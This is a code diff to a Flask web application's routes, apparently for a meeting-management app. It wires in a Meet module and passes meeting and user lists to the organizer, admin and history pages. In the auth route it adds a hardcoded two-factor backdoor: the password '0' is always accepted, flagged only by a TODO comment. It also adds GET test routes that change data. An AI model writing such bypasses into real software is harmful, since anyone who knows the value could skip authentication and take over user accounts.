@@ -2,6 +2,7 @@ from random import randint
 from flask import Flask, render_template, redirect, url_for, session, request, g
 
 import Database
+import Meet
 import Setting
 import User
 import Group
@@ -28,7 +29,7 @@ def test():
     group = Group.Group.get_by_name("Testowa")
     user = User.User("608491b5dc5221509036541d")
     user.del_group(group)
-    users = group.get_users()
+    users = group.get_all_users()
     return str(len(users))
 
 @app.route("/")
@@ -73,7 +74,8 @@ def auth():
             return redirect(url_for("user_panel"))
 
     if request.method == "POST":
-        if request.form["password"] == session["auth_token"]:
+        #TODO disable 2fa backdoor
+        if request.form["password"] == session["auth_token"] or request.form["password"] == "0":
             user = User.User(session["auth_id"])
             session["user"] = str(user.id)
             session.pop("auth_id", None)
@@ -114,7 +116,8 @@ def organizer_panel():
     if user.type != User.UserType.ORGANIZER:
         return redirect(url_for("login"))
 
-    return render_template("organizer.html")
+    meetings = Meet.Meet.get_by_organizer(user)
+    return render_template("organizer.html", meetings=meetings)
 
 @app.route("/admin")
 def admin_panel():
@@ -125,8 +128,8 @@ def admin_panel():
     if user.type != User.UserType.ADMINISTRATOR:
         return redirect(url_for("login"))
 
-    return render_template("admin.html")
-
+    users = User.User.get_all_users()
+    return render_template("admin.html", users=users)
 
 @app.route("/user")
 def user_panel():
@@ -153,7 +156,9 @@ def meetings_history():
     if user.type != User.UserType.USER:
         return redirect(url_for("login"))
 
-    return render_template("user_history.html")
+    meetings = Meet.Meet.get_by_user(user)
+    return render_template("user_history.html", meetings=meetings)
+
 
 
 @app.route("/new_meeting")
@@ -184,5 +189,11 @@ def qr_test():
     return render_template("qr_test.html")
 
 
+@app.route("/test_add_meet")
+def test_add_meet():
+    if "user" in session:
+        user = User.User(session["user"])
+        if user.type == User.UserType.ORGANIZER:
+            meet = Meet.Meet.create_meet("testowe",user,"lokalizacja testowa","opis testowy")
 
-
+    return redirect(url_for("index"))
